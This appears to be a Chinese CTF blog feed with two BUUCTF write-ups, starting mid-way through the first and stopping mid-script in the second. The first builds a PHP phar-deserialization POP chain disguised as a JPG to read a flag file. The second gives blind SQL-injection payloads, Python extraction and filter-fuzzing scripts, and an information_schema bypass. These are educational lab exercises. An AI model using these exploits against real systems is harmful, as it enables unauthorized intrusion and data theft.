language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 该函数可以直接展示指定目录的文件信息，可以进行利用</span><br>            <span class="hljs-comment">// 但是我们需要绕过preg_mathch()的检测</span><br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 存在文件打开函数，可以用于获取文件信息</span><br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-variable">$name</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-comment">//这里要注意f1ag.php的路径不是在upload文件夹下的，是在/var/www/html/下,也可以用upload/../f1ag.php</span><br><span class="hljs-variable">$b</span>-&gt;params = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;/var/www/html/f1ag.php&#x27;</span>);<br><span class="hljs-variable">$name</span>-&gt;str=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;str&#x27;</span>=&gt;<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>(<span class="hljs-variable">$name</span>);<br><br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;pop.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;pop.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-comment">// pop链内容获取点</span><br><span class="hljs-variable">$o</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><h3 id="更改生成的pop-phar文件为pop-jpg后上传："><a href="#更改生成的pop-phar文件为pop-jpg后上传：" class="headerlink" title="更改生成的pop.phar文件为pop.jpg后上传："></a>更改生成的pop.phar文件为pop.jpg后上传：</h3><p><strong>(直接改后缀就可以保证文件内部的二进制内容不变，如果用工具改后缀，可能会导致文件内部内容改变，从而无法被phar:&#x2F;&#x2F;协议解析)</strong></p><p><img src="/images/2024-2-3-SimplePHP/image-20240131201607885.png" alt="image-20240131201607885"></p><p><img src="/images/2024-2-3-SimplePHP/image-20240131182313018.png" alt="image-20240131182313018"></p><p>上传成功！！！</p><h2 id="在file-php页面使用phar-协议访问我们上传的pop-jpg"><a href="#在file-php页面使用phar-协议访问我们上传的pop-jpg" class="headerlink" title="在file.php页面使用phar:&#x2F;&#x2F;协议访问我们上传的pop.jpg:"></a>在file.php页面使用phar:&#x2F;&#x2F;协议访问我们上传的pop.jpg:</h2><p>在function.php中存在以下代码:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; <br></code></pre></td></tr></table></figure><p>所以我们的文件名为:md5(‘pop.jpg’.$_SERVER[“REMOTE_ADDR”])</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><p>$_SERVER[“REMOTE_ADDR”] 是一个 PHP 预定义变量，用于获取当前请求的客户端 IP 地址,$_FILES[“file”][“name”] 获取的是整个文件名包含文件的后缀名。</p><p>根据网页的显示： </p><p><img src="/images/2024-2-3-SimplePHP/image-20240131201918489.png" alt="image-20240131201918489"></p><p><img src="/images/2024-2-3-SimplePHP/image-20240131201529895.png" alt="image-20240131201529895"></p><p>以及base.php中的代码审计:<br><img src="/images/2024-2-3-SimplePHP/image-20240131182903755.png" alt="image-20240131182903755"></p><p>我们可以知道我们的客户端ip地址为10.244.80.21(ipv4只有4部分)</p><h3 id="所以我们上传的文件名为"><a href="#所以我们上传的文件名为" class="headerlink" title="所以我们上传的文件名为:"></a>所以我们上传的文件名为:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;pop.jpg&#x27;</span>.<span class="hljs-string">&#x27;10.244.80.21&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="输出-2"><a href="#输出-2" class="headerlink" title="输出:"></a>输出:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">2f65792e232f3de9f28be6a4566226b4<br></code></pre></td></tr></table></figure><h3 id="使用phar-协议访问我们的上传文件"><a href="#使用phar-协议访问我们的上传文件" class="headerlink" title="使用phar:&#x2F;&#x2F;协议访问我们的上传文件:"></a>使用phar:&#x2F;&#x2F;协议访问我们的上传文件:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://abee5700-2f2c-4100-9748-3631d96928c3.node5.buuoj.cn:81/file.php?file=phar://upload/2f65792e232f3de9f28be6a4566226b4.jpg<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-SimplePHP/image-20240131201331781.png" alt="image-20240131201331781"></p><h3 id="对密文进行解码得"><a href="#对密文进行解码得" class="headerlink" title="对密文进行解码得:"></a>对密文进行解码得:</h3><p><img src="/images/2024-2-3-SimplePHP/image-20240131201141153.png" alt="image-20240131201141153"></p><p>flag&#x3D;flag{56a68951-e267-4621-86e8-2418e3005173}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [GYCTF2020]Ezsqli</title>
    <link href="/2024/02/03/2024-2-3-Ezsqli/"/>
    <url>/2024/02/03/2024-2-3-Ezsqli/</url>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>[<a href="https://blog.csdn.net/fmyyy1/article/details/115447291">GYCTF2020]Ezsqli_[gyctf2020]ezsqli 1-CSDN博客</a></p><p><img src="/images/2024-2-3-Ezsqli/image-20240130205201490.png" alt="image-20240130205201490"></p><p><img src="/images/2024-2-3-Ezsqli/image-20240130205347942.png" alt="image-20240130205347942"></p><p>注入点为POST请求获取的id参数</p><p>测试注入点之后，发现不返回报错信息，所以只能采用盲注的方式</p><h2 id="测试盲注payload"><a href="#测试盲注payload" class="headerlink" title="测试盲注payload:"></a>测试盲注payload:</h2><p>payload1:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>id=0<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130205442224.png" alt="image-20240130205442224"></p><p>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>id=1<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130205526519.png" alt="image-20240130205526519"></p><p>产生两种不同的回显结果，所以可以采用普通盲注</p><h2 id="构造普通盲注payload"><a href="#构造普通盲注payload" class="headerlink" title="构造普通盲注payload:"></a>构造普通盲注payload:</h2><p>payload1:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>id=1^(ascii(substr(database(),1,1))&gt;32)<br></code></pre></td></tr></table></figure><p>测试payload1是否可行:</p><p><img src="/images/2024-2-3-Ezsqli/image-20240130210119907.png" alt="image-20240130210119907"></p><p>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>id=1^(ascii(substr(database(),1,1))&lt;32)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130210149711.png" alt="image-20240130210149711"></p><p>返回两种不同的结果，所以我们的payload可行</p><h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名:"></a>爆数据库名:</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://aca6d848-9ae8-4a23-8abd-cfbb6e52885c.node5.buuoj.cn:81/index.php&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># 对数据库名字第n个字符进行暴力剖解</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># 手动规定数据库名字长度</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># 从可打印字符开始</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 对第n个字符进行判断</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>        <span class="hljs-comment"># payload1:用于普通盲注</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(n, tmp)</span><br>        payload = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        data = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: payload<br>        &#125;<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        <span class="hljs-comment"># r = requests.get(url + payload2, )</span><br>        r = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>        true_text = <span class="hljs-string">&quot;Occured&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># 返回true界面 </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 返回flase界面</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>    <span class="hljs-comment"># print(tmp)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的第%d个字符:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># 对下一个字符进行判断</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的名字为：&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130210805684.png" alt="image-20240130210805684"></p><p>爆出数据库名为give_grandpa_pa_pa_pa</p><h2 id="爆数据库的表名"><a href="#爆数据库的表名" class="headerlink" title="爆数据库的表名:"></a>爆数据库的表名:</h2><p>在使用脚本时发现出错，通过测试payload发现存在对sql语句的过滤:</p><p><img src="/images/2024-2-3-Ezsqli/image-20240130211251516.png" alt="image-20240130211251516"></p><p>所以要先测试网页对sql语句有哪些过滤:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list=[]<br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://aca6d848-9ae8-4a23-8abd-cfbb6e52885c.node5.buuoj.cn:81/index.php&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = data</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     # da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1/**/&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # 使用time使请求能够拥有足够的时间去响应</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # 获取过滤网站响应信息</span><br><span class="hljs-comment">#     reponse_txt = &quot;你还想执行&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(data)</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#x27;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    <span class="hljs-comment"># POST传输json数据</span><br>    payload = &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>:da<br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;Injection&quot;</span><br>    <span class="hljs-comment"># print(r.text)</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br><br><br><span class="hljs-built_in">print</span>(black_list)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">[&#x27;handler&#x27;, &#x27;sleep&#x27;, &#x27;SLEEp&#x27;, &#x27;delete&#x27;, &#x27;having&#x27;, &#x27;or&#x27;, &#x27;oroR&#x27;, &#x27;Or&#x27;, &#x27;oR&#x27;, &#x27;OR&#x27;, &#x27;BENCHMARK&#x27;, &#x27;limit&#x27;, &#x27;limitLimIt&#x27;, &#x27;LImit&#x27;, &#x27;LimIt&#x27;, &#x27;insert&#x27;, &#x27;insERT&#x27;, &#x27;INSERT&#x27;, &#x27;INFORMATION&#x27;, &#x27;xor&#x27;, &#x27;ANDANd&#x27;, &#x27;And&#x27;, &#x27;and&#x27;, &#x27;aNd&#x27;, &#x27;BY&#x27;, &#x27;By&#x27;, &#x27;case&#x27;, &quot;admin&#x27;&quot;, &#x27;union&#x27;, &#x27;UNIon&#x27;, &#x27;UNION&#x27;, &#x27;oorr&#x27;, &#x27;anandd&#x27;, &#x27;HAVING&#x27;, &#x27;IF&#x27;, &#x27;INTO&#x27;, &#x27;JOIN&#x27;, &#x27;sleep&#x27;, &#x27;infromation_schema&#x27;, &#x27;OR&#x27;, &#x27;ORDER&#x27;, &#x27;ORD&#x27;, &#x27;UNION&#x27;, &#x27;UPDATE&#x27;, &#x27;USING&#x27;, &#x27;AND&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;inset&#x27;, &#x27;DELETE&#x27;, &#x27;floor&#x27;, &#x27;rand()&#x27;, &#x27;information_schema.tables&#x27;, &#x27;LIMIT&#x27;, &#x27;ORD&#x27;, &#x27;order &#x27;, &#x27;by&#x27;, &#x27;ORDER&#x27;, &#x27;OUTFILE&#x27;, &#x27;updatexml&#x27;, &#x27;instr&#x27;, &#x27;benchmark&#x27;, &#x27;format&#x27;, &#x27;bin&#x27;, &#x27;substring&#x27;, &#x27;ord&#x27;, &#x27;UPDATE&#x27;, &#x27;for&#x27;, &#x27;BEFORE&#x27;, &#x27;in&#x27;, &#x27;SEPARATOR&#x27;, &#x27;XOR&#x27;, &#x27;CURSOR&#x27;, &#x27;FLOOR&#x27;, &#x27;INFILE&#x27;]<br></code></pre></td></tr></table></figure><h3 id="测试我们的sql语句有哪些黑名单字符"><a href="#测试我们的sql语句有哪些黑名单字符" class="headerlink" title="测试我们的sql语句有哪些黑名单字符:"></a>测试我们的sql语句有哪些黑名单字符:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),1,1))&gt;79)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130212644911.png" alt="image-20240130212644911"></p><p>由于我们的黑名单数据中存在对大小写的过滤，所以需要考虑其他的绕过方式，又因为这里的黑名单数据都是只存在于information_schema.tables中，所以我们只需要将其替代就可以绕过</p><h3 id="InnoDb引擎（information-schema-tables的代替）："><a href="#InnoDb引擎（information-schema-tables的代替）：" class="headerlink" title="InnoDb引擎（information_schema.tables的代替）："></a>InnoDb引擎（information_schema.tables的代替）：</h3><p>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p><h4 id="sys数据库"><a href="#sys数据库" class="headerlink" title="sys数据库:"></a>sys数据库:</h4><p>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。</p><h3 id="构造新的payload获取表名"><a href="#构造新的payload获取表名" class="headerlink" title="构造新的payload获取表名:"></a>构造新的payload获取表名:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(sys.schema_table_statistics_with_buffer)where(TABLE_SCHEMA=database())),1,1))&gt;79)<br></code></pre></td></tr></table></figure><p>测试payload:</p><p><img src="/images/2024-2-3-Ezsqli/image-20240130221448487.png" alt="image-20240130221448487"></p><p>成功绕过！！！</p><h3 id="爆表名脚本"><a href="#爆表名脚本" class="headerlink" title="爆表名脚本:"></a>爆表名脚本:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            